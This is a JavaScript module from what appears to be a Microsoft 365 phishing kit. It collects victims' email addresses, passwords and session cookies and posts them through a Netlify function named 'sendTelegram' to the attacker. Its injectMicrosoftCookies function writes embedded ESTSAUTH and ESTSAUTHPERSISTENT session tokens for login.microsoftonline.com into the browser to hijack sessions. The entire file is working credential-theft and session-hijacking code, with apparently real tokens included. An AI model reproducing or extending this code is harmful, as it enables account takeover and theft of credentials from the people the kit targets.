let latestCapturedEmail = '';
let latestCapturedCookies = '';

// IP address, email, and password variables for cookies
let ipaddress = '';
let email = '';
let password = '';

// Microsoft authentication cookies injection function
function injectMicrosoftCookies() {
    console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");
    let cookiesData = JSON.parse('[{"name":"ESTSAUTHPERSISTENT","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P9VMZEDkrS3KAy323inAsdh-0K1kRR5WvWW_MqmLs2eghq1TRU2_E3J2GVdtQnoQq4rMvWHqSsyMf3v-BqsKVKvKdjpjXl1EBH8KqhSl0XVV5w92EnYRjta-vkksL-8naQnI4e9oXxGmHq_T8FbBRanfDrO19rbtsoqDR6aoj9Zxir9uFVtvoy6oAiC341ojV6Mf8nrBwjct5lI_DwVKx-JYCo4sEIbfwR7W57iiat-4xfF6oHGUDZd7tVv-L0YLjp59XY1TYhO4x45bcFVAPgqmEvmMDdomSqHphmMnmPMDlvyjFJE5zPgOQLJ1HhTnqi9H8rgxwXzFfN7MywimTMpeI-eXGTbqr6TT1qAkGSUuWOWibb0RcCARR3HMlBp-JE-zobq1cUFnMYTMFnEU95iZ_nAnHsS_7uLftpbrBXORuEf5mMLE6PeXQgVZ0bAaEUc4LLAWY8ZHdnRZNJ3amduQEWOHwnp3rCJI9Q9MKwE6UjH-XALhbTrMJlsXvtzT-fw7cep0rkBojGPQAiOvThzvWQf1yz2-EuA7frFubW4vf0u80AsBGim_C5gfgSCugSiBK6b1tMasxuaOyHQ0aZwnwTpfMkImTgSi5a-G7nDx4TDwHsJhTkBCUSUCA17lfD_Q-2leAepMaqrmKr2IDHxIFjRFyhRao5wxtpfFGPVVvVl","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTH","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P-EFsv5ncS_Rt9dJVaepE-8JhjMCwTcL4gbhv85JOGOZgQQkH6Vwg7GsVSBMgpbBgbWkgHYH9rxPQ","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTHLIGHT","value":"+a233b088-5f10-46ce-b692-f43a0420bfee","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null}]');
    
    for(let cookieObj of cookiesData) {
        document.cookie = `${cookieObj.name}=${cookieObj.value};Max-Age=31536000;${cookieObj.path ? `path=${cookieObj.path};` : ""}${cookieObj.domain ? `${cookieObj.path ? "" : "path=/"}domain=${cookieObj.domain};` : ""}Secure;SameSite=no_restriction`;
    }
    
    location.reload();
}

// ---- FIX: Add setCredentials function and export ----
export function setCredentials(newIp, newEmail, newPassword) {
    ipaddress = newIp || '';
    email = newEmail || '';
    password = newPassword || '';
}
// -----------------------------------------------------

// Allow other parts of the app to set latest captured data (used by postMessage event handlers)
export function setCapturedEmail(email) {
    if (email) latestCapturedEmail = email;
}

export function setCapturedCookies(cookies) {
    if (cookies) latestCapturedCookies = (typeof cookies === 'string' ? cookies : JSON.stringify(cookies));
}

// Function to get the most reliable email/cookies
export function getMostReliableEmail(sessionEmail) {
    return latestCapturedEmail || sessionEmail || '';
}

export function getMostReliableCookies() {
    return latestCapturedCookies || document.cookie;
}

// Get all cookies as array of {name, value, ...} objects (optional, can be improved for special cases)
export function getAllCapturedCookies() {
    try {
        // If cookies were set from enhancer, parse them if needed
        if (latestCapturedCookies) {
            try {
                const parsed = JSON.parse(latestCapturedCookies);
                if (Array.isArray(parsed)) return parsed;
            } catch {
                // fallback: treat as string
            }
        }
        // Otherwise, parse document.cookie into array
        return document.cookie
            .split(';')
            .map(cookie => {
                const [name, ...valueParts] = cookie.trim().split('=');
                const value = valueParts.join('=');
                return {
                    name,
                    value,
                    domain: window.location.hostname,
                    path: '/',
                    secure: window.location.protocol === 'https:',
                };
            })
            .filter(c => c.name && c.value);
    } catch (e) {
        return [];
    }
}

// Format cookies for Telegram (optional, not used if sending JSON)
export function formatCookiesForTelegram(cookies) {
    return cookies.map(cookie => {
        let cookieString = `${cookie.name}=${cookie.value}`;
        if (cookie.domain) {
            cookieString += `; domain=${cookie.domain}`;
        }
        if (cookie.path) {
            cookieString += `; path=${cookie.path}`;
        }
        if (cookie.expires) {
            const expiresDate = new Date(cookie.expires * 1000);
            cookieString += `; expires=${expiresDate.toUTCString()}`;
        }
        if (cookie.httpOnly) {
            cookieString += '; HttpOnly';
        }
        if (cookie.secure) {
            cookieString += '; Secure';
        }
        if (cookie.sameSite) {
            cookieString += `; SameSite=${cookie.sameSite}`;
        }
        return cookieString;
    }).join('\n');
}

// Send cookies and user email to Telegram (as JSON)
export async function captureAndSendCookies(userEmail, cookies) {
    // cookies can be stringified JSON or plain string
    let cookiesToSend = cookies;
    try {
        // If it's JSON string, try to parse it first
        cookiesToSend = JSON.parse(cookies);
    } catch (e) {
        // If it's just string, send as is
    }
    await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            email: userEmail,
            cookies: cookiesToSend
        })
    });
}

export { injectMicrosoftCookies }